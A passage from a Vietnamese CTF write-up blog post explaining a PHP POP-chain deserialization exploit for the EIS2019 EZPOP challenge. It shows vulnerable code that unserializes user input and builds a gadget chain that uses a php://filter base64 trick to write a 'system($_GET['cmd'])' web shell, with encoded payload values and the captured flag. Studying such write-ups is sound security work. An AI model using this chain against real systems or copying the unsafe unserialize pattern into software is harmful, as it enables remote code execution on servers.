        <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
    <span class="p">}</span>

<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'src'</span><span class="p">]))</span>
<span class="p">{</span>
    <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
<span class="p">}</span>

<span class="nv">$dir</span> <span class="o">=</span> <span class="s2">"uploads/"</span><span class="p">;</span>

<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">))</span>
<span class="p">{</span>
    <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>
<span class="p">}</span>
<span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"data"</span><span class="p">]);</span>
</pre></table></code></div></div><h3 id="phân-tích-1"><span class="mr-2"><strong>Phân tích</strong></span><a href="#phân-tích-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Thoạt nhìn vào đoạn code này thì mình phát hiện một thứ khá thú vị <code class="language-plaintext highlighter-rouge">file_put_contents</code> xuất hiện ở class B trong hàm <code class="language-plaintext highlighter-rouge">set()</code>, hàm này thực hiện việc ghi <code class="language-plaintext highlighter-rouge">$data</code> vào <code class="language-plaintext highlighter-rouge">$filename</code> =&gt; có thể tận dụng để ghi một php shell trên server 😋. Ta sẽ cùng truy ngược lại các giá trị liên quan tới chúng.</p><ul><li>filename: được gán bằng <code class="language-plaintext highlighter-rouge">$this-&gt;getCacheKey($name)</code> với <code class="language-plaintext highlighter-rouge">$name</code> là tham số truyền vào và được prepend với một giá trị trong <code class="language-plaintext highlighter-rouge">options['prefix']</code> của class.<div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>  <span class="k">public</span> <span class="k">function</span> <span class="n">getCacheKey</span><span class="p">(</span><span class="kt">string</span> <span class="nv">$name</span><span class="p">):</span> <span class="kt">string</span> <span class="p">{</span>
      <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">options</span><span class="p">[</span><span class="s1">'prefix'</span><span class="p">]</span> <span class="mf">.</span> <span class="nv">$name</span><span class="p">;</span>
  <span class="p">}</span>
</pre></table></code></div></div><li>data: được gán bằng <code class="language-plaintext highlighter-rouge">$this-&gt;serialize($value)</code> với <code class="language-plaintext highlighter-rouge">$value</code> là tham số truyền vào và <code class="language-plaintext highlighter-rouge">$serialize</code> lấy từ một giá trị trong <code class="language-plaintext highlighter-rouge">options['serialize']</code> của class.<div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>  <span class="k">protected</span> <span class="k">function</span> <span class="n">serialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">):</span> <span class="kt">string</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span> <span class="p">{</span>
          <span class="k">return</span> <span class="p">(</span><span class="n">string</span><span class="p">)</span> <span class="nv">$data</span><span class="p">;</span>
      <span class="p">}</span>

      <span class="nv">$serialize</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">options</span><span class="p">[</span><span class="s1">'serialize'</span><span class="p">];</span>

      <span class="k">return</span> <span class="nv">$serialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
  <span class="p">}</span>
</pre></table></code></div></div><li>expire: được gán bằng <code class="language-plaintext highlighter-rouge">$this-&gt;getExpireTime($expire);</code> với <code class="language-plaintext highlighter-rouge">$expire</code> là tham số truyền vào<div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>  <span class="k">protected</span> <span class="k">function</span> <span class="n">getExpireTime</span><span class="p">(</span><span class="nv">$expire</span><span class="p">):</span> <span class="kt">int</span> <span class="p">{</span>
      <span class="k">return</span> <span class="p">(</span><span class="n">int</span><span class="p">)</span> <span class="nv">$expire</span><span class="p">;</span>
  <span class="p">}</span>
</pre></table></code></div></div></ul><p>Nhưng ở đây nảy sinh ra một vấn đề 🤔, vì <code class="language-plaintext highlighter-rouge">$data = "&lt;?php\n//" . sprintf('%012d', $expire) . "\n exit();?&gt;\n" . $data;</code> $data truyền vào mặc dù là một “User-Controllable Input” nhưng bởi vì được append vào cuối chuỗi nên khi thực thi shell thì sẽ thoát do <code class="language-plaintext highlighter-rouge">exit()</code>. <a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list">Đây</a> là một bài post hay về các cách bypass hàm này và mình sẽ làm theo cách base64 decode.</p><p>Đến đây ta biết được last gadget sẽ là method <code class="language-plaintext highlighter-rouge">set()</code> của class B vậy class A sẽ làm nhiệm vụ chain tới B. Nhìn lại source thì mình phát hiện được magic method <code class="language-plaintext highlighter-rouge">__destruct</code> gọi tới <code class="language-plaintext highlighter-rouge">save()</code> ở trong <code class="language-plaintext highlighter-rouge">save()</code> gọi <code class="language-plaintext highlighter-rouge">$this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire);</code> =&gt; cần gán <code class="language-plaintext highlighter-rouge">store = new class B()</code>. Và <code class="language-plaintext highlighter-rouge">$key, $content, $expire</code> sẽ ứng với <code class="language-plaintext highlighter-rouge">$name, $value, $expire</code></p><ul><li>key = “shell.php”<li>expire gán đại bằng “bla”.<li>content được gán bằng return value của <code class="language-plaintext highlighter-rouge">$this-&gt;getForStorage();</code>, mình sẽ contruct sao cho <code class="language-plaintext highlighter-rouge">getForStorage()</code> trả về <code class="language-plaintext highlighter-rouge">[[],"PD9jdWMgY3VjdmFzYigpOz8+"]</code><ul><li><code class="language-plaintext highlighter-rouge">$cache = array();</code><li><code class="language-plaintext highlighter-rouge">$complete = base64_encode("xxx".base64_encode('&lt;?php system($_GET[\'cmd\'])?&gt;'));</code> ở đây cần thêm vào trước 3 kí tự bởi vì <code class="language-plaintext highlighter-rouge">&lt;?php\n//" . sprintf('%012d', $expire) . "\n exit();?&gt;\n</code> sẽ biến thành <code class="language-plaintext highlighter-rouge">php//000000000000exit</code> khi dùng php wrapper -&gt; length = 21, mà một nhóm chứa 4 kí tự base64 sẽ được decode thành 3 bytes nên ta phải thêm 3 bytes <code class="language-plaintext highlighter-rouge">xxx</code> vào trước để tránh làm “hỏng” web shell.</ul></ul><p>Sau cùng <code class="language-plaintext highlighter-rouge">$value="W1tdLCJQRDl3YUhBZ2MzbHpkR1Z0S0NSZlIwVlVXeWRqYldRblhTa1wvUGc9PSJd"</code> nên ở đoạn code <code class="language-plaintext highlighter-rouge">$data = $this-&gt;serialize($value);</code> cần base64 decode trở lại và <code class="language-plaintext highlighter-rouge">$data</code> sẽ bằng <code class="language-plaintext highlighter-rouge">[[],"PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk\/Pg=="]</code> -&gt; <code class="language-plaintext highlighter-rouge">$this-&gt;options['serialize'] = "base64_decode"</code>. Lần decode cuối cùng là lúc ghi vào file <code class="language-plaintext highlighter-rouge">shell.php</code> dùng php wrapper và lưu ý các kí tự không hợp lệ sẽ bị bỏ qua.</p><p>Cuối cùng để ghi thành công một php shell lên server chỉ cần set <code class="language-plaintext highlighter-rouge">$this-&gt;options['prefix'] = 'php://filter/write=convert.base64-decode/resource='</code> 🤗</p><h3 id="khai-thác-1"><span class="mr-2"><em>Khai thác</em></span><a href="#khai-thác-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Kết quả: <img data-src="/assets/img/popChain/eis2019/EZPOP/result.png" alt="result" data-proofer-ignore> <em>result</em></p><blockquote class="prompt-info"><div><p>flag{94d92ddd-e935-46d4-93ef-f4fb272bd81c}</p></div></blockquote><h2 id="tài-liệu-tham-khảo"><span class="mr-2">Tài liệu tham khảo</span><a href="#tài-liệu-tham-khảo" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><a href="https://websec.files.wordpress.com/2010/11/rips_ccs.pdf">https://websec.files.wordpress.com/2010/11/rips_ccs.pdf</a></p><p><a href="https://vickieli.dev/insecure%20deserialization/pop-chains/">https://vickieli.dev/insecure%20deserialization/pop-chains/</a></p><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list">https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list</a></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/websec/'>WebSec</a>, <a href='/categories/ctf/'>CTF</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/pop-chain/" class="post-tag no-text-decoration" >pop chain</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=PHP POP Chain - to^&amp;url=https://to016.github.io//posts/phpPopChain/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=PHP POP Chain - to^&amp;u=https://to016.github.io//posts/phpPopChain/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://to016.github.io//posts/phpPopChain/&amp;text=PHP POP Chain - to^" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/PHPLFI2RCE/">Các kĩ thuật nâng cao trong khai thác lỗ hổng PHP LFI2RCE</a><li><a href="/posts/angstromctf2022/">AngstromCTF 2022</a><li><a href="/posts/SWandMITM/">Service worker và Man-in-the-Middle Attack</a><li><a href="/posts/noted/">Noted - picoCTF2022</a><li><a href="/posts/31linephp/">31 Line PHP - SPbCTF2021</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/xss/">xss</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/timing-attack/">timing attack</a> <a class="post-tag" href="/tags/xxe/">xxe</a> <a class="post-tag" href="/tags/cache-probing/">cache probing</a> <a class="post-tag" href="/tags/cookie-bomb/">cookie bomb</a> <a class="post-tag" href="/tags/csrf/">csrf</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/lfi/">lfi</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/noted/"><div class="card-body"> <em class="timeago small" data-ts="1649084880" > 2022-04-04 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Noted - picoCTF2022</h3><div class="text-muted small"><p> Sơ lược về challenge Trang gồm có hai chức năng Login và Register overview1 Tiếp đó ta thể tạo note và gửi link để report. overview2 Phân tích Sau khi thử thì mình nhận thấy có lỗi xss ở đây C...</p></div></div></a></div><div class="card"> <a href="/posts/31linephp/"><div class="card-body"> <em class="timeago small" data-ts="1649176500" > 2022-04-05 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>31 Line PHP - SPbCTF2021</h3><div class="text-muted small"><p> Challenge này từ năm ngoái nhưng mình vẫn muốn viết bởi 1 phần nó khá hay và lí do ngoài lề khác là năm nay mình mới tập tành viết blog 😝 Source code source code Phân tích Nhìn qua source code th...</p></div></div></a></div><div class="card"> <a href="/posts/noCookies/"><div class="card-body"> <em class="timeago small" data-ts="1649398020" > 2022-04-08 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>NoCookies - DiceCTF2022</h3><div class="text-muted small"><p> Link challenge https://instancer.mc.ax/no-cookies https://admin-bot.mc.ax/no-cookies Source code Download Sơ lược về trang web overview Sẽ có 2 chức năng: Register -&amp;gt; đăng kí account và ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/crewctf2022/" class="btn btn-outline-primary" prompt="Older"><p>CrewCTF 2022</p></a> <a href="/posts/nahamconctf2022/" class="btn btn-outline-primary" prompt="Newer"><p>NahamconCTF 2022</p></a></div><script type="text/javascript"> $(function () { const origin = "https://giscus.app"; const iframe = "iframe.giscus-frame"; const lightTheme = "light"; const darkTheme = "dark_dimmed"; let initTheme = lightTheme; if ($("html[data-mode=dark]").length > 0 || ($("html[data-mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches)) { initTheme = darkTheme; } let giscusAttributes = { "src": "https://giscus.app/client.js", "data-repo": "to016/to016.github.io", "data-repo-id": "R_kgDOHGuNaQ", "data-category": "Comments", "data-category-id": "DIC_kwDOHGuNac4CPNhc", "data-mapping": "pathname", "data-reactions-enabled": "1", "data-emit-metadata": "0", "data-theme": initTheme, "data-input-position": "bottom", "data-lang": "en", "crossorigin": "anonymous", "async": "" }; let giscusScript = document.createElement("script"); Object.entries(giscusAttributes).forEach(([key, value]) => giscusScript.setAttribute(key, value)); document.getElementById("tail-wrapper").appendChild(giscusScript); addEventListener("message", (event) => { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { /* global theme mode changed */ const mode = event.data.message; const theme = (mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme); const message = { setConfig: { theme: theme } }; const giscus = document.querySelector(iframe).contentWindow; giscus.postMessage({ giscus: message }, origin); } }); }); </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/nguyendt0">Tô Đỉnh Nguyên</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/xss/">xss</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/timing-attack/">timing attack</a> <a class="post-tag" href="/tags/xxe/">xxe</a> <a class="post-tag" href="/tags/cache-probing/">cache probing</a> <a class="post-tag" href="/tags/cookie-bomb/">cookie bomb</a> <a class="post-tag" href="/tags/csrf/">csrf</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/lfi/">lfi</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
